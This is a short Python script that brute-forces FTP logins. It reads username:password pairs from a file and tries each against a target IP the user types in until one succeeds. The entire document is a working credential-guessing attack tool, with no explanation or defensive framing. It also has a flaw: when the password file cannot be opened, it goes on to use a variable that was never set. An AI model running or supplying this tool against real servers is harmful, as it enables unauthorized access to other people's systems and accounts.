#!/usr/bin/python

import ftplib

def bruteLogin(host, pswFile):
	try:
		pF = open(pswFile, "r")
	except:
		print ("[!!] File doesn't exist")
	for line in pF.readlines():
		userName = line.split(':')[0]
		userPass = line.split(':')[1].strip('\n')
		print ("[+] Trying: " + userName + " / " + userPass)
		try:
			ftp = ftplib.FTP(host)
			login = ftp.login(userName,userPass)
			print ("[+] Login succeeded with: " + userName + " / " + userPass)
			ftp.quit()
			return
		except:
			pass
	print ("[-] Password not in list")



host = raw_input("[*] Enter target IP Address: ")
pswFile = raw_input("Enter the user/password file path: ")
bruteLogin(host, pswFile)
